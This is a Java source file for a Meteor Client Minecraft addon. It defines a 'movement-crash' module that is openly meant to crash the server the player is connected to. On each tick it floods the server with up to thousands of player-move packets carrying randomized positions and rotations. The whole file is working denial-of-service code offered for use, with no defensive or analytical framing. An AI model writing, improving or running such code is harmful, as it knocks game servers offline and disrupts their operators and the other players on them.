package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.game.GameLeftEvent;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.systems.modules.Module;
import minegame159.meteorclient.settings.*;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class MovementCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
            .name("packets")
            .description("How many packets to send per tick")
            .defaultValue(2000)
            .min(1)
            .sliderMax(10000)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(false)
            .build()
    );

    public MovementCrash() {
        super(MeteorCrashAddon.CATEGORY, "movement-crash", "Tries to crash the server by spamming move packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(mc.getNetworkHandler() == null) return;
        try {
            Vec3d current_pos = mc.player.getPos();
            for (int i = 0; i < packets.get(); i++) {
                PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + getDistributedRandom(1),
                        current_pos.y + getDistributedRandom(1), current_pos.z + getDistributedRandom(1),
                        (float) rndD(90), (float) rndD(180), true);
                mc.getNetworkHandler().sendPacket(move_packet);
            }
        } catch (Exception ignored) {
            ChatUtils.error("Stopping movement crash because an error occurred!");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) return;
        toggle();
    }

    public static double rndD(double rad) {
        Random r = new Random();
        return r.nextDouble() * rad;
    }

    public double getDistributedRandom(double rad) {
        return (rndD(rad) - (rad / 2));
    }

}
